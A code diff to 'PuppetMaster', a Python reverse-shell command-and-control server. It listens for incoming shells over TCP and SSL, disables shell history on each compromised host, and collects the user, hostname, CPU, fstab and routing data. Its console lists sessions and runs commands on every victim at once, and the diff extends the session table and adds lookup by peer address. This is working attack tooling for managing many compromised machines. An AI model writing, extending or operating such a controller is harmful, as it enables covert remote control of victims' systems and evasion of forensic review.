@@ -30,6 +30,7 @@ print('''\033[1;37m
 reverse_host     = '127.0.0.1'
 reverse_tcp_port = "47080"
 reverse_ssl_port = "47443"
+MultiMaster_port = "47470"
 
 class PuppetMaster:
     def __init__(self):
@@ -73,14 +74,17 @@ async def handle_shell_init(reader, writer):
     randomStringSuffix = randomString()
     randomStringWhoamiPrefix = randomString()
     randomStringWhoamiSuffix = randomString()
+    randomStringCPUinfoPrefix = randomString()
+    randomStringCPUinfoSuffix = randomString()
     randomStringHostnamePrefix = randomString()
     randomStringHostnameSuffix = randomString()
     randomStringInitEndSuffix = randomString()
     init_command = str()
     init_command += "export HISTSIZE=0;"
     init_command += f"echo {randomStringWhoamiPrefix} && whoami && echo {randomStringWhoamiSuffix}\n"
+    init_command += f"echo {randomStringCPUinfoPrefix} && cat /proc/cpuinfo && echo {randomStringCPUinfoSuffix}\n"
     init_command += f"echo {randomStringHostnamePrefix} && cat /etc/hostname && echo {randomStringHostnameSuffix}\n"
-    init_command += f"echo {randomStringPrefix} && whoami && cat /proc/version /etc/fstab /proc/net/route /proc/cpuinfo && echo {randomStringSuffix}\n"
+    init_command += f"echo {randomStringPrefix} && whoami && cat /proc/version /etc/fstab /proc/net/route && echo {randomStringSuffix}\n"
     writer.write( init_command.encode() )
     await writer.drain()
 
@@ -116,8 +120,14 @@ async def handle_shell_init(reader, writer):
                         randomStringHostnameSuffix
                         ).strip()
 
+                cpuinfo  = getTextBetweenStrings(
+                        init_data.decode().replace(f"echo {randomStringCPUinfoPrefix}", "").replace(f"echo {randomStringCPUinfoSuffix}", ""),
+                        randomStringCPUinfoPrefix,
+                        randomStringCPUinfoSuffix
+                        ).strip()
+
                 #获取CPU核心数
-                session_cpu_core = str(puppetHash.count("processor"))
+                session_cpu_core = str(cpuinfo.count("processor"))
                 #根据系统信息计算Session Hash
                 session_hash = hashlib.md5(puppetHash.encode()).hexdigest()
 
@@ -143,7 +153,7 @@ async def handle_shell_init(reader, writer):
 
                     session["org"] = org[0]+org[1]
                     Puppet_Master.sessions.append(session)
-                    PrintInfo('Session \033[1;37m{session_hash}\033[0m {hostname} {username}  \033[1;37m{sockname} -> {peername}\033[0m {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
+                    PrintInfo(f'Session \033[1;37m{session_hash}\033[0m {hostname} {username}  \033[1;37m{sockname} -> {peername}\033[0m {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
                     break
 
                 else:
@@ -201,8 +211,20 @@ async def MasterConsole():
             break
 
         elif console_cmd.split() and console_cmd.split()[0] == "sessions" :
+            print(
+                    "Session".ljust(32," ") + " " +
+                    "Hostname".ljust(20," ") + " " +
+                    "Username".ljust(8," ") + " " +
+                    "CPU "
+                    )
+            print(
+                    "="*32 + " " +
+                    "="*20 + " " +
+                    "="*8 + " " +
+                    "="*3  + " " 
+                    )
             for session in Puppet_Master.sessions:
-                print(f"\033[1;37m{session['hash']}\033[0m  {session['hostname'].ljust(20,' ')} {session['username'].ljust(8,' ')} {session['core'].ljust(2,' ')} {session['sockname']} -> {session['peername'].ljust(21,' ')}  {session['inittime']} {session['org']} ")
+                print(f"\033[1;37m{session['hash']}\033[0m {session['hostname'].ljust(20,' ')} {session['username'].ljust(8,' ')} {session['core'].ljust(3,' ')} {session['sockname']} -> {session['peername'].ljust(21,' ')} {session['inittime']} {session['org']} ")
             
         elif console_cmd.split() and console_cmd.split()[0] == "listerner":
             print()
@@ -225,7 +247,7 @@ async def MasterConsole():
                 for session in Puppet_Master.sessions:
                     Puppet_Master.current_session = Puppet_Master.sessions[Puppet_Master.sessions.index(session)]
                     execute_result = await Puppet_Master.execute_cmd( execute_cmd )
-                    PrintInfo( Puppet_Master.current_session+" Executed." )
+                    PrintInfo( f"{Puppet_Master.current_session['hash']} {Puppet_Master.current_session['peername']} {Puppet_Master.current_session['org']} Executed." )
 
                 Puppet_Master.current_session = None
 
@@ -242,13 +264,12 @@ async def MasterConsole():
 
         elif console_cmd.split() and console_cmd.split()[0] == "use":
             if len(console_cmd.split()) >1:
-                session_hash = console_cmd.split()[1]
+                session_id = console_cmd.split()[1]
                 for session in Puppet_Master.sessions:
-                    if session_hash == session["hash"]:
+                    if session_id == session["hash"] or session_id == session["peername"]:
                         Puppet_Master.current_session = Puppet_Master.sessions[Puppet_Master.sessions.index(session)]
-                #print(Puppet_Master.current_session)
             else:
-                print("\033[1;31m[!] use session_hash ......\033[0m")
+                print("\033[1;31m[!] Use Session Hash or Peername/RemoteAddress......\033[0m")
 
         elif Puppet_Master.current_session and console_cmd == "bg":
             Puppet_Master.current_session = None
@@ -278,10 +299,12 @@ async def main():
     SSLcontext.load_cert_chain(certfile=certfile, keyfile=keyfile)
     reverse_tcp_server = await asyncio.start_server(handle_shell_init, '0.0.0.0', reverse_tcp_port )
     reverse_ssl_server = await asyncio.start_server(handle_shell_init, '0.0.0.0', reverse_ssl_port, ssl=SSLcontext )
+    #MultiMaster        = await asyncio.start_server(MultiMaster,       '0.0.0.0', MultiMaster_port, ssl=SSLcontext )
 
-    addr = reverse_tcp_server.sockets[0].getsockname()
+    addr     = reverse_tcp_server.sockets[0].getsockname()
+    addr     = addr[0]+":"+str(addr[1])
+
     ssl_addr = reverse_ssl_server.sockets[0].getsockname()
-    addr = addr[0]+":"+str(addr[1])
     ssl_addr = ssl_addr[0]+":"+str(ssl_addr[1])
 
     PrintInfo("socketListener : "+addr)
